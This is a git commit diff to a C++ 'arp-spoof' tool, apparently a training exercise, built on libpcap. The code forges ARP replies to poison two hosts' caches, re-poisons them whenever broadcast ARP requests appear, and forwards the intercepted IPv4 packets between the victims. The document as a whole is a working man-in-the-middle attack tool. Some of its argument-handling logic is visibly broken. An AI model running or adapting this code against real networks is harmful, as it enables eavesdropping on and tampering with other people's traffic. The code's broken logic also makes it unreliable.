3fe08db960dc91b0aa44784bb5c618205587ee53
yeom0331 <yeom0331@naver.com>
2021-02-01 19:01:58 +0900

    Reload file

--- arp.cpp
+++ arp.cpp
@@ -4,7 +4,7 @@ void arp_request(Mac attacker_mac, Ip attacker_ip, Ip sender_ip, pcap_t *handle)
     EthArpPacket packet;
 
     packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
-    packet.eth_.smac_ = Mac(attacker_mac);
+    packet.eth_.smac_ = attacker_mac;
     packet.eth_.type_ = htons(EthHdr::Arp);
 
     packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -12,10 +12,11 @@ void arp_request(Mac attacker_mac, Ip attacker_ip, Ip sender_ip, pcap_t *handle)
     packet.arp_.hln_ = Mac::SIZE;
     packet.arp_.pln_ = Ip::SIZE;
     packet.arp_.op_ = htons(ArpHdr::Request);
-    packet.arp_.smac_ = Mac(attacker_mac);
-    packet.arp_.sip_ = htonl(Ip(attacker_ip));
+
+    packet.arp_.smac_ = attacker_mac;
+    packet.arp_.sip_ = htonl(attacker_ip);
     packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
-    packet.arp_.tip_ = htonl(Ip(sender_ip));
+    packet.arp_.tip_ = htonl(sender_ip);
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
     if(res != 0) {
@@ -26,19 +27,20 @@ void arp_request(Mac attacker_mac, Ip attacker_ip, Ip sender_ip, pcap_t *handle)
 void arp_reply(Mac attacker_mac, Mac sender_mac, Ip sender_ip, Ip target_ip, pcap_t* handle) {
     EthArpPacket packet;
 
-    packet.eth_.dmac_ = Mac(sender_mac);
-    packet.eth_.smac_ = Mac(attacker_mac);
-    packet.eth_.type_ = EthHdr::Arp;
+    packet.eth_.dmac_ = sender_mac;
+    packet.eth_.smac_ = attacker_mac;
+    packet.eth_.type_ = htons(EthHdr::Arp);
 
     packet.arp_.hrd_ = htons(ArpHdr::ETHER);
     packet.arp_.pro_ = htons(EthHdr::Ip4);
     packet.arp_.hln_ = Mac::SIZE;
     packet.arp_.pln_ = Ip::SIZE;
     packet.arp_.op_ = htons(ArpHdr::Reply);
-    packet.arp_.smac_ = Mac(attacker_mac);
-    packet.arp_.sip_ = htonl(Ip(target_ip));
-    packet.arp_.tmac_ = Mac(sender_mac);
-    packet.arp_.tip_ = htonl(Ip(sender_ip));
+
+    packet.arp_.smac_ = attacker_mac;
+    packet.arp_.sip_ = htonl(target_ip);
+    packet.arp_.tmac_ = sender_mac;
+    packet.arp_.tip_ = htonl(sender_ip);
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
     if(res != 0) {
--- main.cpp
+++ main.cpp
@@ -1,4 +1,5 @@
 #include <cstdio>
+#include <iostream>
 #include <pcap.h>
 #include "ethhdr.h"
 #include "arphdr.h"
@@ -9,13 +10,23 @@
 #include "arp.h"
 #include "get_attackerinfo.h"
 
+using namespace std;
+
+#pragma pack(push, 1)
+struct EthIpPacket {
+    EthHdr eth_;
+    ip ip_;
+};
+#pragma pack(pop)
+
 void usage() {
     printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
     printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
 }
 
+
 int main(int argc, char* argv[]) {
-    if (argc != 4) {
+    if (argc != 4 || (argc%2) != 0) {
         usage();
         return -1;
     }
@@ -33,4 +44,90 @@ int main(int argc, char* argv[]) {
 
     const int flow_count = (argc-2)/2;
     EthArpPacket* flow = new EthArpPacket[flow_count];
+
+    int n=0;
+    for(int i=0; i<argc; i+=2) {
+        if(i > 1) {
+            flow[n].arp_.sip_ = Ip(argv[i]);
+            flow[n].arp_.tip_ = Ip(argv[i+1]);
+            n++;
+        }
+    }
+
+    for(int i=0; i<flow_count; i++) {
+        Ip sender_ip = flow[i].arp_.sip_;
+        Ip target_ip = flow[i].arp_.tip_;
+
+        arp_request(attacker_mac, attacker_ip, sender_ip, handle);
+        arp_request(attacker_mac, attacker_ip, target_ip, handle);
+    }
+
+    while(true) {
+        struct pcap_pkthdr* header;
+        const u_char* packet;
+
+        int res = pcap_next_ex(handle, &header, &packet);
+        if(res == 0) continue;
+        if(res == -1 || res == -2) break;
+
+        struct EthArpPacket *etharp = (struct EthArpPacket *)packet;
+
+        if(etharp->eth_.type_ == htons(EthHdr::Arp)) {
+            if(etharp->arp_.op_ == htons(ArpHdr::Reply)) {
+                for(int i=0; i<flow_count; i++) {
+                    if(htonl(etharp->arp_.sip_) == flow[i].arp_.sip_) {
+                        cout << "Arp infect" << '\n';
+                        flow[i].arp_.smac_ = etharp->arp_.smac_;
+                        arp_reply(attacker_mac, flow[i].eth_.smac_, flow[i].arp_.sip_, flow[i].arp_.tip_, handle);
+                        continue;
+                    }
+
+                    if(htonl(etharp->arp_.sip_) == flow[i].arp_.tip_) {
+                        flow[i].eth_.dmac_ = etharp->arp_.smac_;
+                    }
+                }
+                continue;
+            }
+
+            if(etharp->arp_.op_ == htons(ArpHdr::Request)) {
+                if(etharp->eth_.dmac_ == Mac("FF:FF:FF:FF:FF:FF")) {
+                    for(int i=0; i<flow_count; i++) {
+                        cout << "ARP REINFECT" << '\n';
+                        arp_request(attacker_mac, attacker_ip, flow[i].arp_.sip_, handle);
+                        arp_request(attacker_mac, attacker_ip, flow[i].arp_.tip_, handle);
+                        arp_reply(attacker_mac, flow[i].eth_.smac_, flow[i].arp_.sip_, flow[i].arp_.tip_, handle);
+                    }
+                }
+                continue;
+            }
+        }
+
+        if(etharp->eth_.type_ == htons(EthHdr::Ip4)) {
+            struct EthIpPacket* ethip = (struct EthIpPacket *)packet;
+            if(htonl(ethip->ip_.ip_dst.s_addr) == attacker_ip) {
+                continue;
+            }
+
+            for(int i=0; i<flow_count; i++) {
+                if(htonl(ethip->ip_.ip_dst.s_addr) == flow[i].arp_.sip_) {
+                    ethip->eth_.smac_ = attacker_mac;
+                    ethip->eth_.dmac_ = flow[i].eth_.smac_;
+
+                    pcap_sendpacket(handle, packet, header->len);
+                    continue;
+                }
+
+                if(htonl(ethip->ip_.ip_src.s_addr) == flow[i].arp_.sip_) {
+                    ethip->eth_.smac_ = attacker_mac;
+                    ethip->eth_.dmac_ = flow[i].eth_.dmac_;
+
+                    res = pcap_sendpacket(handle, packet, header->len);
+                    continue;
+                }
+            }
+        }
+    }
+    pcap_close(handle);
 }
+
+
